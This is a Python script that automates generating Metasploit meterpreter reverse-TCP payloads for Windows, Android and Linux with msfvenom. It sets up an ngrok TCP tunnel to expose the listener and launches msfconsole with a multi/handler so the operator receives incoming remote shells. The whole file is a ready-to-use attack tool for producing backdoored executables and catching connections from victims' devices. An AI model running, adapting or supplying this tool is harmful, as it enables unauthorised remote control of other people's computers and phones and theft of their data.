import os
from colorama import *

token = "your ngrok token"

def ngrok_payload():
    os.system("clear")
    print(Fore.GREEN + """

 ██▓███   ▄▄▄     ▓██   ██▓ ██▓     ▒█████   ▄▄▄      ▓█████▄ 
▓██░  ██▒▒████▄    ▒██  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
░▒ ░       ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
░░         ░   ▒   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
               ░  ░░ ░         ░  ░    ░ ░        ░  ░   ░    
                   ░ ░                                 ░      
                   
    """)
    os.system(f"ngrok authtoken {token}")
    tcp = input("TCP port (default 4646) +-> ")
    print("")
    print(Fore.BLUE + "["+ Fore.LIGHTGREEN_EX + "+" + Fore.BLUE + f"]" + Fore.LIGHTGREEN_EX + f" ngrok tcp {tcp}")
    os.system(f"gnome-terminal -- ngrok tcp {tcp} &")
    print("""
            +-> Payloads <-+ 
    [1] windows/meterpreter/reverse_tcp
    [2] android/meterpretere/reverse_tcp
    [3] linux/x86/meterpreter/reverse_tcp
    +-> Payloads <-+

    """)
    payload = input("Payload +-> ")
    lhost = input("Ngrok forwarding host +-> ")
    lport = input("Ngrok forwaring port +-> ")
    namefile = input("Namefile +-> ")
    if payload == "1":
        payload1 = "windows/meterpreter/reverse_tcp"

        print(Fore.BLUE + "["+ Fore.LIGHTGREEN_EX + "+" + Fore.BLUE + "]" + Fore.LIGHTGREEN_EX +  f" msfvenom -p {payload1} lhost={lhost} lport={lport} -f exe -o {namefile}.exe")
        os.system(f"msfvenom -p {payload1} lhost={lhost} lport={lport} -f exe -o {namefile}.exe")
        print("Done!!")
        os.system("echo "" >> global.listener")
        file = open("global.listener", "w")
        file.write(f"""
use exploit/multi/handler
set payload {payload1}
set lhost 0.0.0.0
set lport {tcp}
exploit""")
        file.close()
        os.system("gnome-terminal -- msfconsole -r global.listener &")
        print("Done!!")
        input("Enter")
        ngrok_payload()

    if payload == "2":
        payload2 = "android/meterpreter/reverse_tcp"

        print(Fore.BLUE + "["+ Fore.LIGHTGREEN_EX + "+" + Fore.BLUE + f"]" +Fore.LIGHTGREEN_EX +  f" msfvenom -p {payload2} lhost={lhost} lport={lport} -o {namefile}.apk")
        os.system(f"msfvenom -p {payload2} lhost={lhost} lport={lport} -o {namefile}.apk")
        print("Done!!")
        os.system("echo "" >> global.listener")
        file = open("global.listener", "w")
        file.write(f"""
use exploit/multi/handler
set payload {payload2}
set lhost 0.0.0.0
set lport {tcp}
exploit""")
        file.close()
        os.system("gnome-terminal -- msfconsole -r global.listener &")
        print("Done!!")
        input("Enter")
        ngrok_payload()


    if payload == "3":
        payload3 = "linux/x86/meterpreter/reverse_tcp"

        print(Fore.BLUE + "["+ Fore.LIGHTGREEN_EX + "+" + Fore.BLUE + f"]" + Fore.LIGHTGREEN_EX + f" msfvenom -p {payload3} lhost={lhost} lport={lport} -f elf -o {namefile}.elf")
        os.system(f"msfvenom -p {payload3} lhost={lhost} lport={lport} -f elf -o {namefile}.elf")
        print("Done!!")
        os.system("echo "" >> global.listener")
        file = open("global.listener", "w")
        file.write(f"""
use exploit/multi/handler
set payload {payload3}
set lhost 0.0.0.0
set lport {tcp}
exploit""")
        file.close()
        os.system("gnome-terminal -- msfconsole -r global.listener &")
        print("Done!!")
        input("Enter")
        ngrok_payload()





ngrok_payload()
